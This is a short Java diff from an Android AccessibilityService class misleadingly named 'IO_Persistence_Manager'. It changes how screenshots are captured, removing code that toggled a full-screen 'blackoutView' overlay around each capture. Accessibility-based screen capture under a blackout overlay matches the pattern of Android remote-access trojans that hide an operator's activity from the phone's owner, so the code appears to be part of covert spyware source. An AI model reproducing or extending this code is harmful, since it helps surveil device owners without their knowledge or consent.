@@ -1024,34 +1024,16 @@ public class IO_Persistence_Manager extends AccessibilityService {
         if (isScreenshotting) { callback.onFailure("BUSY"); return; }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             isScreenshotting = true;
-
-            final View bView = blackoutView;
-            if (bView != null) {
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    try { bView.setVisibility(View.INVISIBLE); } catch (Exception ignored) {}
-                });
-            }
-
             ScreenshotCallback wrappedCallback = new ScreenshotCallback() {
                 @Override
                 public void onSuccess(byte[] jpegData) {
                     isScreenshotting = false;
-                    if (bView != null) {
-                        new Handler(Looper.getMainLooper()).post(() -> {
-                            try { bView.setVisibility(View.VISIBLE); } catch (Exception ignored) {}
-                        });
-                    }
                     callback.onSuccess(jpegData);
                 }
 
                 @Override
                 public void onFailure(String err) {
                     isScreenshotting = false;
-                    if (bView != null) {
-                        new Handler(Looper.getMainLooper()).post(() -> {
-                            try { bView.setVisibility(View.VISIBLE); } catch (Exception ignored) {}
-                        });
-                    }
                     callback.onFailure(err);
                 }
             };
